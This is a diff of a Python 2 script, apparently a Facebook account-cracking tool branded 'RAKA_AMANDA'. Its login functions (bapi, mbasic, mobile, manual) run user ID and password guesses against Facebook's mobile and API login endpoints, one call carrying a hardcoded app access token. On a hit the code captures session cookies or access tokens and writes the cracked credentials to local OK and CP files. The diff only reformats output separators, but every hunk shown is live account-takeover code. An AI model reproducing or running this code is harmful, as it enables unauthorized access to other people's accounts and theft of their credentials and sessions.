@@ -289,9 +289,9 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;91m[RAKA_AMANDA] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
-			cp.append("%s ® %s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+			print("\r\033[0;91m[RAKA_AMANDA] %s®%s®%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			cp.append("%s®%s"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write(" + %s®%s®%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
 		day = (" ")
 		month = (" ")
@@ -324,15 +324,15 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[0;92m[RAKA_AMANDA] %s ® %s ® %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
-				ok.append("%s ® %s"%(uid, pw))
-				open("OK/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				ok.append("%s®%s"%(uid, pw))
+				open("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;91m[RAKA_AMANDA] %s ® %s\033[0;92m        "%(uid, pw))
-				cp.append("%s ® %s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;92m        "%(uid, pw))
+				cp.append("%s®%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 
@@ -377,15 +377,15 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[RAKA_AMANDA] %s ® %s ® %s\033[0;95m"%(uid, pw, kuki))
-				ok.append("%s ® %s"%(uid, pw))
-				open("OK/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;95m"%(uid, pw, kuki))
+				ok.append("%s®%s"%(uid, pw))
+				open("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[RAKA_AMANDA] %s ® %s\033[0;96m        "%(uid, pw))
-				cp.append("%s ® %s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;96m        "%(uid, pw))
+				cp.append("%s®%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 
@@ -431,15 +431,15 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[RAKA_AMANDA] %s ® %s ® %s\033[0;97m"%(uid, pw, kuki))
-				ok.append("%s ® %s"%(uid, pw))
-				open("OK/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, kuki))
+				ok.append("%s®%s"%(uid, pw))
+				open("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;91m[RAKA_AMANDA] %s ® %s\033[0;91m        "%(uid, pw))
-				cp.append("%s ® %s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;91m        "%(uid, pw))
+				cp.append("%s®%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 				break
 				continue
 
@@ -485,15 +485,15 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;92m[RAKA_AMANDA] %s ® %s ® %s\033[0;97m"%(uid, pw, kuki))
-					ok.append("%s|%s"%(uid, pw))
-					open("OK/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+					print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, kuki))
+					ok.append("%s®%s"%(uid, pw))
+					open("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;91m[RAKA_AMANDA] %s ® %s\033[0;91m        "%(uid, pw))
-					cp.append("%s ® %s"%(uid, pw))
-					open("CP/%s.txt"%(tBilall),"a").write(" + %s ® %s\n"%(uid, pw))
+					print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;91m        "%(uid, pw))
+					cp.append("%s®%s"%(uid, pw))
+					open("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
 					break
 					continue
 
